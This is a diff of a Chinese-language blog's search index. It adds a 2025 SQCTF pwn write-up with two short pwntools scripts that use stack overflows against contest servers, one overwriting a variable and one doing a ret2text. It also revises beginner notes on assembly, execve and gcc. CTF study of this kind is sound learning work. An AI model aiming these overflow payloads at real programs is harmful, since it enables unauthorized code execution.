@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>2025SQCTF</title>
+      <link href="/2025/04/12/SQCTF/"/>
+      <url>/2025/04/12/SQCTF/</url>
+      
+        <content type="html"><![CDATA[<p>很荣幸参加了第四届SQCTF，作为新生赛，难度还可以，因为本人能力还不够，并没能够akpwn，还得再努力努力（毕竟是想打XCTF的，这点实力是肯定不行的。</p><h1 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h1><p>一道简单到不能再简单的nc签到题。</p><h1 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h1><p>这是一道64位的题，基本没开什么保护。</p><p><img src="/images/cat.png"><img src="/images/cat.backdoor"></p><p>这里可以看到有一个后门函数，其判断条件为v5的值为真，因为我们能输入的是v4，而且观察栈上结构可以知道地址相差0x50-4。所以可以通过输入覆盖到v5并将v5的值变为真即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">io=remote(&#x27;challenge.qsnctf.com&#x27;,31547)</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x50-4)+p64(1)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h1><p>这是一道64位的题，开启了NX保护，因此不好使用shellcode。</p><p><img src="/images/gift"><img src="/images/gift.1"></p><p>通过IDA可以发现存在明显栈溢出，并且有后门函数，所以这题是一道简单的ret2text，通过栈溢出覆盖返回地址为后门函数。（注意堆栈平衡。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;challenge.qsnctf.com&#x27;,32767)</span><br><span class="line">elf=ELF(&#x27;./gift&#x27;)</span><br><span class="line">backdoor=elf.sym[&#x27;gift&#x27;]</span><br><span class="line">payload=cyclic(64+8)+p64(0x40101a)+p64(0x4011B6)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h1><p>这是一道64位的题目，基本没开什么保护。</p><p><img src="/images/pwn01">并且有&#x2F;bin&#x2F;sh的地址，但是没有system函数，所以我第一反应应该是64位的ret2syscall。</p><p>32位与64位syscall的相同点是都必须调用寄存器，都想构造出execve(&#x2F;bin&#x2F;sh,0,0)这种结构。</p><p>两者最主要的区别是系统调用号、传参以及最后的中断命令不一样，但是大致思路都是一样的，在这就不多说了。（主要是找不到当时写的exp了，又懒得再写一遍。</p><h1 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h1><p>这也是一道简单的64位题目。</p><p>我感觉是一道简单的ret2libc的题目，只需要满足一些特定的条件就能进入溢出函数了，然后就是普通的libc了，在此也不想做过多的介绍了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSAPP</title>
+      <link href="/2025/03/31/CSAPP/"/>
+      <url>/2025/03/31/CSAPP/</url>
+      
+        <content type="html"><![CDATA[<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> csapp </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> csapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Polar-Ctf2025春季赛复现</title>
       <link href="/2025/03/23/Polar-Ctf%E5%A4%8D%E7%8E%B0/"/>
       <url>/2025/03/23/Polar-Ctf%E5%A4%8D%E7%8E%B0/</url>
@@ -104,11 +154,11 @@
     
     
     <entry>
-      <title>CTFSHOW_PWN_入门——前置基础</title>
-      <link href="/2025/03/10/CTFSHOW-PWN-%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/"/>
-      <url>/2025/03/10/CTFSHOW-PWN-%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/</url>
+      <title>CTFSHOW_PWN_入门</title>
+      <link href="/2025/03/10/CTFSHOW-PWN-%E5%85%A5%E9%97%A8/"/>
+      <url>/2025/03/10/CTFSHOW-PWN-%E5%85%A5%E9%97%A8/</url>
       
-        <content type="html"><![CDATA[<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><p>简单而言就是进行一个远程连接，区分<strong>ssh</strong>与<strong>nc</strong>连接，注意题目给的文件、提示以及会使用Linux系统就行了。（因为一般来说很多题目需要写脚本，而并非简单的远程连接）</p><p>尽管这部分没有太多东西记录，但有些还是得知道的。</p><ol><li><p>**后门函数&#x2F;程序：**通常是指在软件、程序中故意或有意留下的隐蔽入口或者秘密功能，允许未经授权的用户绕过正常的安全机制去访问、控制以及修改系统，因此我们可以利用它对一个程序进行攻击（<em><strong>得在合法条件下，否则怎么进局子都不知道</strong></em>）。这也是后续我们需要找到或者构造出的一个非常重要的东西。</p></li><li><p>execve函数：执行程序函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int execve(const char *filename,char *const argv[],char *const envp[])</span><br></pre></td></tr></table></figure><p>该函数需要三个参数：filename（要执行的程序文件名或路劲）、argv（以NULL结尾的字符串数组，表示传递给新程序的命令行参数）、envp（表示新程序的环境变量）。</p></li></ol><h1 id="前置基础："><a href="#前置基础：" class="headerlink" title="前置基础："></a>前置基础：</h1><p>这部分主要简单介绍了pwn的一些东西，主要目的是带领新手对pwn有一个大概的了解，不至于太过迷茫。pwn作为ctf比赛中的重点也是难点，对计算机的底层要求非常高，因此让许多人望而却步，既然选择要学pwn，那么就一定要<strong>坚持下去</strong>，不要三天打鱼两天晒网，那样是没有任何效果的。</p><p>这部分会分为几小节，通过CTFSHOW_PWN_入门的题，来对pwn进行一个简单的描述（<strong>我不会详细讲解题目，因为有官方的WP，肯定比我说的详细</strong>），具体的一些知识以及技巧会在后续的文章中详细解释。</p><h2 id="PWN5-12"><a href="#PWN5-12" class="headerlink" title="PWN5-12"></a>PWN5-12</h2><p>这一部分主要讲的是汇编语言的一些简单知识。</p><p><img src="/images/ctfshow_pwn_%E5%85%A5%E9%97%A8_pwn5-12.png"></p><p>简单的总结一下一些的汇编语言知识（具体的在另一篇文章）：</p><ol><li><p>寄存器：CPU内部用来存放数据的小型存储区域，是CPU的内部构造，不同的CPU的寄存器是不一样的，因此具体问题具体分析。一般分为通用寄存器、控制寄存器以及段寄存器。</p></li><li><p>部分汇编指令：</p><p>**move：**将数据从一个地方转移到另一个地方。</p><p>**add：**将两个值相加。</p><p>**sub：**从第一个值中减去第二个值，并将该值保存到前者。</p><p>**jmp：**无条件跳转到制定的地址。</p><p>**push：**推入堆栈。</p><p>**pop：**弹出堆栈。</p><p>**call：**调用子程序，并将返回地址压入堆栈。</p><p>**ret：**从堆栈中弹出返回地址，并将控制权转移回调用点。</p></li></ol><p>还有一点就是move edx,ebx是将ebx的值赋给edx，而move edx,[ebx]是将ebx指向的地址的值赋给edx，有无[]其表达的含义是不一样的。</p><p>ok，这一部分就先讲到这，因为这部分就是简单的介绍一下汇编语言，带新手感受下氛围，具体的知识还得自己多去了解。</p><h1 id="PWN13-16"><a href="#PWN13-16" class="headerlink" title="PWN13-16"></a>PWN13-16</h1><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>这道题主要考查的是如何使用GCC。那么就在这里简单介绍一下GCC以及如何使用。</p><p>简答来说，GCC就是一个c&#x2F;c++编译器，gcc是GCC中的C语言编译器，其基本语法为：gcc [option] [filename]。其中option表示参数，filename表示相关文件的名字。</p><p>下面简单介绍一下一些参数：</p><ol><li>-o：直接生成可执行文件。</li><li>-E：仅执行预处理。（生成后缀为.i的预编译文件）</li><li>-S：执行预编译过后停止。（生成后缀为.s的预编译文件）</li><li>-c：编译程序但不进行链接成可执行文件。（生成后缀为.o的文件）</li><li>-g：生成调试信息，方便gdb。</li><li>-v：查看版本，显示gcc执行的详细过程。</li></ol><p>gcc的工作过程可以分为预处理、编译、汇编、链接四个步骤。</p><p>接下来就来简单的使用下gcc，用它编写一个简单的程序——hello world（在Linux系统中使用，因此得熟练使用Linux系统才行，后面再写篇文章来介绍一下Linux系统）。</p><ol><li><pre><code>touch hello.c<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   先输入该代码，其中touch表示的是创建新的文件，本句代码含义就是创建一个新文件hello.c。</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   vim hello.c</span><br></pre></td></tr></table></figure>再输入该代码，其中vim表示的是进行文件编辑，本句代码含义就是对文件hello.c进行编辑。</code></pre></li><li><pre><code>#include&lt;stdio.h&gt;int main()&#123;    printf(&quot;hello world!!!&quot;);    return 0;&#125;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   输入一个简单的C语言代码，接着按Esc键，再按:，然后按wq，最后按回车键，这表示的是保存对文件的编辑。</span><br><span class="line"></span><br><span class="line">4. 进行完上述操作，我们就将C语言源代码写好了，但其并不能运行，因为源代码得经过预处理、编译、汇编和链接后才能成为可执行文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>gcc hello.c</code></pre><p>对其进行处理，可以得到.&#x2F;a.out这个可执行文件，最后运行该文件就可以输出hello world!!!</p></li></ol><p>这里只是简单的介绍与使用gcc，详细一点的知识就自己去摸索。</p><h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2>]]></content>
+        <content type="html"><![CDATA[<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><p>简单而言就是进行一个远程连接，区分<strong>ssh</strong>与<strong>nc</strong>连接，注意题目给的文件、提示以及会使用Linux系统就行了。（因为一般来说很多题目需要写脚本，而并非简单的远程连接）</p><p>尽管这部分没有太多东西记录，但有些还是得知道的。</p><ol><li><p>**后门函数&#x2F;程序：**通常是指在软件、程序中故意或有意留下的隐蔽入口或者秘密功能，允许未经授权的用户绕过正常的安全机制去访问、控制以及修改系统，因此我们可以利用它对一个程序进行攻击（<em><strong>得在合法条件下，否则怎么进局子都不知道</strong></em>）。这也是后续我们需要找到或者构造出的一个非常重要的东西。</p></li><li><p>execve函数：执行程序函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int execve(const char *filename,char *const argv[],char *const envp[])</span><br></pre></td></tr></table></figure><p>该函数需要三个参数：filename（要执行的程序文件名或路劲）、argv（以NULL结尾的字符串数组，表示传递给新程序的命令行参数）、envp（表示新程序的环境变量）。</p></li></ol><h1 id="前置基础："><a href="#前置基础：" class="headerlink" title="前置基础："></a>前置基础：</h1><p>这部分主要简单介绍了pwn的一些东西，主要目的是带领新手对pwn有一个大概的了解，不至于太过迷茫。pwn作为ctf比赛中的重点也是难点，对计算机的底层要求非常高，因此让许多人望而却步，既然选择要学pwn，那么就一定要<strong>坚持下去</strong>，不要三天打鱼两天晒网，那样是没有任何效果的。</p><p>这部分会分为几小节，通过CTFSHOW_PWN_入门的题，来对pwn进行一个简单的描述（<strong>我不会详细讲解题目，因为有官方的WP，肯定比我说的详细</strong>），具体的一些知识以及技巧会在后续的文章中详细解释。</p><h2 id="PWN5-12"><a href="#PWN5-12" class="headerlink" title="PWN5-12"></a>PWN5-12</h2><p>这一部分主要讲的是汇编语言的一些简单知识。</p><p><img src="/images/ctfshow_pwn_%E5%85%A5%E9%97%A8_pwn5-12.png"></p><p>简单的总结一下一些的汇编语言知识（具体的在另一篇文章）：</p><ol><li><p>寄存器：CPU内部用来存放数据的小型存储区域，是CPU的内部构造，不同的CPU的寄存器是不一样的，因此具体问题具体分析。一般分为通用寄存器、控制寄存器以及段寄存器。</p></li><li><p>部分汇编指令：</p><p>**move：**将数据从一个地方转移到另一个地方。</p><p>**add：**将两个值相加。</p><p>**sub：**从第一个值中减去第二个值，并将该值保存到前者。</p><p>**jmp：**无条件跳转到制定的地址。</p><p>**push：**推入堆栈。</p><p>**pop：**弹出堆栈。</p><p>**call：**调用子程序，并将返回地址压入堆栈。</p><p>**ret：**从堆栈中弹出返回地址，并将控制权转移回调用点。</p></li></ol><p>还有一点就是move edx,ebx是将ebx的值赋给edx，而move edx,[ebx]是将ebx指向的地址的值赋给edx，有无[]其表达的含义是不一样的。</p><p>ok，这一部分就先讲到这，因为这部分就是简单的介绍一下汇编语言，带新手感受下氛围，具体的知识还得自己多去了解。</p><h1 id="PWN13-16"><a href="#PWN13-16" class="headerlink" title="PWN13-16"></a>PWN13-16</h1><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>这道题主要考查的是如何使用GCC。那么就在这里简单介绍一下GCC以及如何使用。</p><p>简答来说，GCC就是一个c&#x2F;c++编译器，gcc是GCC中的C语言编译器，其基本语法为：gcc [option] [filename]。其中option表示参数，filename表示相关文件的名字。</p><p>下面简单介绍一下一些参数：</p><ol><li>-o：直接生成可执行文件。</li><li>-E：仅执行预处理。（生成后缀为.i的预编译文件）</li><li>-S：执行预编译过后停止。（生成后缀为.s的预编译文件）</li><li>-c：编译程序但不进行链接成可执行文件。（生成后缀为.o的文件）</li><li>-g：生成调试信息，方便gdb。</li><li>-v：查看版本，显示gcc执行的详细过程。</li></ol><p>gcc的工作过程可以分为预处理、编译、汇编、链接四个步骤。</p><p>接下来就来简单的使用下gcc，用它编写一个简单的程序——hello world（在Linux系统中使用，因此得熟练使用Linux系统才行，后面再写篇文章来介绍一下Linux系统）。</p><ol><li><pre><code>touch hello.c<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   先输入该代码，其中touch表示的是创建新的文件，本句代码含义就是创建一个新文件hello.c。</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   vim hello.c</span><br></pre></td></tr></table></figure>再输入该代码，其中vim表示的是进行文件编辑，本句代码含义就是对文件hello.c进行编辑。</code></pre></li><li><pre><code>#include&lt;stdio.h&gt;int main()&#123;    printf(&quot;hello world!!!&quot;);    return 0;&#125;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   输入一个简单的C语言代码，接着按Esc键，再按:，然后按wq，最后按回车键，这表示的是保存对文件的编辑。</span><br><span class="line"></span><br><span class="line">4. 进行完上述操作，我们就将C语言源代码写好了，但其并不能运行，因为源代码得经过预处理、编译、汇编和链接后才能成为可执行文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>gcc hello.c</code></pre><p>对其进行处理，可以得到.&#x2F;a.out这个可执行文件，最后运行该文件就可以输出hello world!!!</p></li></ol><p>这里只是简单的介绍与使用gcc，详细一点的知识就自己去摸索。</p>]]></content>
       
       
       <categories>
